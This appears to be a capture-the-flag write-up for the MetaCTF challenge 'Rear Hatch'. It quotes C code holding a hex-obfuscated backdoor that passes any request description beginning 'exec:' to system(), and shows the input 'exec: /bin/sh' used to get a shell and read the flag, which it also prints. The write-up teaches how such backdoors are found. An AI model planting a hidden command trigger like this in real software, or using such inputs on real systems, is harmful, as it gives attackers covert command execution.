---
layout: post  
permalink: /writeups/metactf/2025/january/rear-hatch/writeup/  
title: "Rear Hatch"  
date: 2025-01-24 05:30  
tags: Binary Exploitation  
description: "Rear Hatch"
---

## **Challenge Name: Rear Hatch**

### **Solves**

- **Solves:** 161
- **Points:** 200

### **Description**

We've been getting a lot of suspicious reports in our Maintenance Schedule Management application. We're worried that the contractor who wrote the application may have included some sort of backdoor. Can you check it out?

Download the source code [here](Resources/RearHatch.c), then when you're ready, connect to the real service with `nc kubenode.mctf.io 30014`.

---

### **Approach**

After analyzing the source code, we can see that the application performs the following four functions:

```c
printf("\n=== Maintenance Schedule Management ===\n");
printf("1. Add Maintenance Request\n");
printf("2. View Maintenance Requests\n");
printf("3. Delete Maintenance Request\n");
printf("4. Mark Request as Completed\n");
```

- **Option 1:** Allows us to create a request.
- **Option 2:** Allows us to view requests.
- **Option 3:** Allows us to delete a request.
- **Option 4:** Executes the request and marks it as complete.

The vulnerability lies in the `markRequestCompleted()` function. The following check in this function:

```c
if (requests[i].id == id && (strncmp((char *)requests + i * 264 + 4, "\x65\x78\x65\x63\x3a", 5) == 0 ? system((char *)requests + i * 264 + 9), 1 : 1))
```

executes a command if the description starts with the string `exec:`. The `system()` function is used to execute any command entered after `exec:`.

**Exploitation:**

What if we enter a command that gives us a shell?  
We can try the following input after selecting option 1:

```
exec: /bin/sh
```

This gives us a shell. We can now run commands like:

```
ls
cat flag.txt
```

### **Flag**

```
MetaCTF{4lw4ys_r34d_4ll_7h3_c0d3}
``` 

--- 
